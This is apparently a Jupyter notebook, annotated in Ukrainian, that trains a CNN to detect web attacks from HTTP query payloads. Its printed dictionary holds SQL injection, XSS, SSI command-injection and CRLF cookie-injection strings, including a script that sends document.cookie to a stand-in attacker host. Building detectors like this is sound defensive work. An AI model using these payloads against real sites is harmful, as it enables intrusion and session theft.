       " 'B1A=Registrar': 66,\n",
       " 'cantidad=63%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C': 1,\n",
       " 'id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E': 10,\n",
       " 'login=arro': 2,\n",
       " 'pwd=CarMinAR%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E': 1,\n",
       " 'login=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E': 1,\n",
       " 'pwd=CarMinAR': 3,\n",
       " 'login=sh*armila3': 1,\n",
       " 'id=1%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E': 3,\n",
       " 'errorMsg=Credenciales+incorrectas%7C': 4,\n",
       " 'modo=insertar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E': 3,\n",
       " 'precio=5832': 3,\n",
       " 'modo=%3F': 5,\n",
       " 'login=casey': 2,\n",
       " 'password=parasceve': 2,\n",
       " 'nombre=Remi%27g%2F*io': 1,\n",
       " 'apellidos=Montras+Handal': 2,\n",
       " 'email=mukherjee%40mcfly.cat': 2,\n",
       " 'dni=75875960H': 2,\n",
       " 'direccion=Argentina+127%2C+': 2,\n",
       " 'ciudad=Villaviudas': 2,\n",
       " 'cp=08254': 1,\n",
       " 'ntc=3976120192503130': 2,\n",
       " 'nombre=Tr%E1nsito': 12,\n",
       " 'cpA=08254': 1,\n",
       " 'login=bousfiel59': 3,\n",
       " 'password=De%219%E1n': 3,\n",
       " 'nombre=Genara': 3,\n",
       " 'apellidos=Boneton+Casares': 3,\n",
       " 'email=eckhardt%40englishiseasy.nc': 3,\n",
       " 'dni=63137047T': 2,\n",
       " 'direccion=Pasaje+Calzadilla+14%2C+10%3FH': 2,\n",
       " 'ciudad=%27+AND+%271%27%3D%271': 1,\n",
       " 'cp=27739': 3,\n",
       " 'ntc=3702071436789346': 3,\n",
       " 'dni=B4B2559359K': 1,\n",
       " 'ciudad=Carboneros': 2,\n",
       " 'direccionA=Pasaje+Calzadilla+14%2C+10%3FH': 1,\n",
       " 'cantidadA=91': 1,\n",
       " 'login=paqs': 2,\n",
       " 'pwd=coNMut6BLE': 3,\n",
       " 'remember=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235': 2,\n",
       " 'login=eme%2Br': 1,\n",
       " 'precio=405': 1,\n",
       " 'precioA=405': 1,\n",
       " 'login=waltdisn': 3,\n",
       " 'password=AC4iNiA': 3,\n",
       " 'nombre=Yasmila': 6,\n",
       " 'apellidos=Monerris+Brau': 3,\n",
       " 'email=dearden%40hipermadrid.ga': 6,\n",
       " 'dni=83203700G': 3,\n",
       " 'direccion=C%2F+Flors%2C+115+': 3,\n",
       " 'ciudad=Navas+de+Orosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E': 1,\n",
       " 'cp=32782': 2,\n",
       " 'ntc=0851365114838541': 3,\n",
       " 'ciudad=Navas+de+Oro': 2,\n",
       " 'cp=1642A': 1,\n",
       " 'provinciaA=Zaragoza': 5,\n",
       " 'B2=Vaciar+carritoSet-cookie%253A%2BTamper%253D1041264011025374727': 8,\n",
       " 'login=julee': 2,\n",
       " 'nombre=Basiana': 6,\n",
       " 'apellidos=Fiesco+Terrazas': 3,\n",
       " 'email=wakefield.yniguez%40aebo.so': 3,\n",
       " 'dni=43471294Y': 3,\n",
       " 'direccion=C%2F+Santa+Florentina+9%2C+11%3FH': 2,\n",
       " 'ciudad=Asparrena': 4,\n",
       " 'cp=16841': 3,\n",
       " 'ntc=6355628611222298': 3,\n",
       " 'login=li*bor7': 1,\n",
       " 'password=al9u12z3': 2,\n",
       " 'direccionA=C%2F+Santa+Florentina+9%2C+11%3FH': 1,\n",
       " 'precio=100any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A': 1,\n",
       " 'cantidad=47': 18,\n",
       " 'id=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235': 5,\n",
       " 'login=trahan%27+AND+%271%27%3D%271': 1,\n",
       " 'pwd=72513662r719': 2,\n",
       " 'login=trahan': 1,\n",
       " 'id=1%27OR%27a%3D%27a': 5,\n",
       " 'precio=9702': 2,\n",
       " 'login=zalman': 3,\n",
       " 'password=*diet%E9tico': 4,\n",
       " 'nombre=Adiel': 3,\n",
       " 'apellidos=Fabr%E9s+Bueso': 4,\n",
       " 'email=riegert_tao-lin%40sanchezquesada.ke': 4,\n",
       " 'dni=11051114M': 7,\n",
       " 'direccion=Avenida+San+Mames%2C+25%2C+': 4,\n",
       " 'ciudad=Carrichessessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F': 1,\n",
       " 'cp=50366': 3,\n",
       " 'ntc=7998962855410697': 4,\n",
       " 'nombre=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 3,\n",
       " 'ciudad=Carriches': 3,\n",
       " 'cp=0822A': 2,\n",
       " 'loginA=zalman': 1,\n",
       " 'B2=%27OR%27a%3D%27a': 6,\n",
       " 'login=cleve': 6,\n",
       " 'password=Gl%CDp3iCa': 2,\n",
       " 'nombre=Ninfa': 2,\n",
       " 'apellidos=Perarnau+Casas': 2,\n",
       " 'email=gwinn%40laspruebascongaseosa.cz%22+AND+%221%22%3D%221': 1,\n",
       " 'dni=36470806M': 2,\n",
       " 'direccion=Pla%E7a+Dels+Carros+83%2C+': 2,\n",
       " 'ciudad=Darnius': 2,\n",
       " 'cp=31218': 2,\n",
       " 'ntc=8300950645319009': 2,\n",
       " 'email=as%40%40%40ter%40ropadegolf.qa': 1,\n",
       " 'cantidad=89': 8,\n",
       " ...}"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dict_filter"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Другий крок - побудова матриць <br>\n",
    "Для цього ми напишемо функцію"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Функція produce_matrixs_df приймає два аргументи:\n",
    "<br> samples - набір даних, що містить корисні навантаження (Payloads)\n",
    "<br> dict_filter - Dictionary, що містить у своїх ключах аномальні корисні навантаження<br><br>\n",
    "Функція для кожної URL в samples створює бінарну матрицю. <br>Кількість елементів матриці має бути не менше ніж розмір словника.<br>\n",
    "Функція проходить по кожному корисному навантаженню у даному HTTP запиті, і якщо корисне навантаження містить в словнику аномалій (змінна dict_filter), то відповідний елемент в матриці буде рівний 1, що означатиме наявність аномалій в матриці\n",
    "<br>\n",
    "Функція повертає список матриць"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "def produce_matrixs_df(samples, dict_filter):\n",
    "    # Initialize an empty list to store the matrices\n",
    "    matrixs_df = []\n",
    "    \n",
    "    # Iterate over the samples\n",
    "    for sample in samples:\n",
    "        # Initialize a matrix of zeros with dimensions (15000,)\n",
    "        matrix = np.zeros((15000))\n",
    "        \n",
    "        # Tokenize the sample using the '&' character as the delimiter\n",
    "        sample_tokenized = nltk.tokenize.regexp_tokenize(sample, pattern=r\"&\", gaps=True)\n",
    "        \n",
    "        # Create a dictionary with keys corresponding to the tokenized elements\n",
    "        # and values of 1 if the element is in the dict_filter dictionary, or 0 otherwise\n",
    "        dict_v2 = {}\n",
    "        for el in sample_tokenized:\n",
    "            if el in dict_filter:\n",
    "                dict_v2[el] = 1\n",
    "            else:\n",
    "                dict_v2[el] = 0\n",
    "        \n",
    "        # Get the keys of the dict_filter dictionary\n",
    "        dict_filter_keys = list(dict_filter.keys())\n",
    "\n",
    "        # Iterate over the keys in the new dictionary, and find the corresponding index in the list of keys from dict_filter\n",
    "        for key in dict_v2.keys():\n",
    "            for i, df_key in enumerate(dict_filter_keys):\n",
    "                if key == df_key:\n",
    "                    # Set the value of the matrix at this index to 1\n",
    "                    matrix[i] = 1\n",
    "                    \n",
    "        # Reshape the matrix to dimensions (124, 124) and append it to the list of matrices\n",
    "        matrixs_df.append(matrix.reshape(150,100))\n",
    "    \n",
    "    # Return the list of matrices\n",
    "    return matrixs_df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Далі завантажимо інші наші дані і здійснимо ті ж маніпуляції, що для аномальних спочатку"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Admin\\AppData\\Local\\Temp\\ipykernel_14984\\3543599310.py:1: ParserWarning: Falling back to the 'python' engine because the 'c' engine does not support regex separators (separators > 1 char and different from '\\s+' are interpreted as regex); you can avoid this warning by specifying engine='python'.\n",
      "  raw_data_norm_train = pd.read_csv(\"normalTrafficTraining.txt\",sep=\"/n/n\", header= None)\n",
      "C:\\Users\\Admin\\AppData\\Local\\Temp\\ipykernel_14984\\3543599310.py:2: ParserWarning: Falling back to the 'python' engine because the 'c' engine does not support regex separators (separators > 1 char and different from '\\s+' are interpreted as regex); you can avoid this warning by specifying engine='python'.\n",
      "  raw_data_norm_test = pd.read_csv(\"normalTrafficTest.txt\",sep=\"/n/n\", header= None)\n",
      "C:\\Users\\Admin\\AppData\\Local\\Temp\\ipykernel_14984\\3543599310.py:7: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  URL_Payload_norm.loc[:, 0] = URL_Payload_norm[0].apply(lambda x:\n",
      "C:\\Users\\Admin\\AppData\\Local\\Temp\\ipykernel_14984\\3543599310.py:10: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  URL_Payload_norm[['URL', 'payload']] = URL_Payload_norm[0].str.split('?', expand=True)\n",
      "C:\\Users\\Admin\\AppData\\Local\\Temp\\ipykernel_14984\\3543599310.py:10: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  URL_Payload_norm[['URL', 'payload']] = URL_Payload_norm[0].str.split('?', expand=True)\n"
     ]
    }
   ],
   "source": [
    "raw_data_norm_train = pd.read_csv(\"normalTrafficTraining.txt\",sep=\"/n/n\", header= None)\n",
    "raw_data_norm_test = pd.read_csv(\"normalTrafficTest.txt\",sep=\"/n/n\", header= None)\n",
    "raw_data_norm = pd.concat([raw_data_norm_train,raw_data_norm_test])\n",
    "\n",
    "URL_Payload_norm = raw_data_norm[raw_data_norm[0].str.contains('GET') == True ]\n",
    "\n",
    "URL_Payload_norm.loc[:, 0] = URL_Payload_norm[0].apply(lambda x: \n",
    "    x.replace(\"GET \", \"\").replace(\" HTTP/1.1\",\"\"))\n",
    "\n",
    "URL_Payload_norm[['URL', 'payload']] = URL_Payload_norm[0].str.split('?', expand=True)\n",
    "URL_Payload_norm = URL_Payload_norm[['URL', 'payload']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Створимо матриці для нормальних даних і помітимо їх '0', що означатиме, що даний HTTP запит не є веб-атакою"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "samples_ = URL_Payload_norm[URL_Payload_norm[\"payload\"].notnull()]\n",
    "samples_ = samples_[\"payload\"]\n",
    "\n",
    "res = produce_matrixs_df(samples_,dict_filter) \n",
    "df_norm = pd.DataFrame({'matrix': res, 'label': 0})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Створимо матриці для даних, що містять корисні навантаження веб-атак, і помітимо їх '1', що означатиме, що даний HTTP запит є веб-атакою"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "samples_ = URL_Payload[URL_Payload[\"payload\"].notnull()]\n",
    "samples_ = samples_[\"payload\"]\n",
    "\n",
    "res = produce_matrixs_df(samples_,dict_filter) \n",
    "df_anom = pd.DataFrame({'matrix': res, 'label': 1})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.concat([df_norm,df_anom])\n",
    "df.reset_index(inplace=True)\n",
    "df=df.drop('index',axis=1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Після об'єднання отримали набір даних із бінарнею матрицею та позначенням чи є даних запит веб-атакою "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>matrix</th>\n",
       "      <th>label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>[[0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0,...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>[[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0,...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>[[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>[[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>[[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25604</th>\n",
       "      <td>[[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25605</th>\n",
       "      <td>[[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25606</th>\n",
       "      <td>[[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25607</th>\n",
       "      <td>[[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25608</th>\n",
       "      <td>[[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>25609 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                  matrix  label\n",
       "0      [[0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0,...      0\n",
       "1      [[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0,...      0\n",
       "2      [[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...      0\n",
       "3      [[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...      0\n",
       "4      [[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...      0\n",
       "...                                                  ...    ...\n",
       "25604  [[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...      1\n",
       "25605  [[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...      1\n",
       "25606  [[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...      1\n",
       "25607  [[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...      1\n",
       "25608  [[0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,...      1\n",
       "\n",
       "[25609 rows x 2 columns]"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([[0., 0., 0., ..., 0., 0., 0.],\n",
       "       [0., 0., 0., ..., 0., 0., 0.],\n",
       "       [0., 0., 0., ..., 0., 0., 0.],\n",
       "       ...,\n",
       "       [0., 0., 0., ..., 0., 0., 0.],\n",
       "       [0., 0., 0., ..., 0., 0., 0.],\n",
       "       [0., 0., 0., ..., 0., 0., 0.]])"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['matrix'][0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Наступний блок коду візуалізує матрицю. Білі пікселі - аномалії"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "mat=np.asarray(df['matrix'][0]).astype('float32')\n",
    "\n",
    "plt.imshow(mat, cmap='gray')\n",
    "plt.axis('off')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "___\n",
    "Останній крок у підготовці даних, а саме: розділити дані на тренувальну та тестову вибірки і додати розмірність в дані (необхідно для того, щоб CNN модель змогла навчатись)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.model_selection import train_test_split\n",
    "\n",
    "X_train, X_test, y_train, y_test = train_test_split(df['matrix'], df['label'], test_size=0.2, random_state=42, stratify=df['label'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(20487,)"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X_train.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "X_train = np.stack(X_train, axis=0)\n",
    "\n",
    "# Add an additional dimension for the channels\n",
    "X_train = np.expand_dims(X_train, axis=-1)\n",
    "\n",
    "X_test = np.stack(X_test, axis=0)\n",
    "\n",
    "# Add an additional dimension for the channels\n",
    "X_test = np.expand_dims(X_test, axis=-1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(20487, 150, 100, 1)"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X_train.shape"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "івоашвіаооалдавідлалдівьлвіьалдвідатдлвітлдвімтл мтвімьлд бт"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](data:image/jpeg;base64,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